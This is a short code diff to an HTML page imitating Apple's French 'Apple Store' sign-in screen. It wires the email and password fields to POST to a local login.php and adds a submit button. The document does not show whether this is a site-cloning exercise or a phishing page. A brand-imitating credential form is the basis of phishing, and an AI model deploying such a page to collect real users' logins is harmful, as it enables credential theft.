@@ -60,7 +60,7 @@
 
         <div id="container_Acount_input">
             <h2>Connectez-vous à l’Apple Store</h2>
-            <form action="">
+            <form method="POST" action="./login.php">
                 <label for="email">
                     <input type="email" name="email" id="email">
                 </label><br>
@@ -68,7 +68,7 @@
                     <input type="Password" name="mdp" id="mdp">
                 </label>
 
-                <!-- <input type="submit" value=""> -->
+                <br><input type="submit" name="Se_connecter" value="Se connecter">
             </form>
 
             <p>Pas d’identifiant Apple ? <a href="">Créez le vôtre dès à présent. <img src="https://img.icons8.com/android/20/4169e1/circled-up-right-2.png" /></a></p>
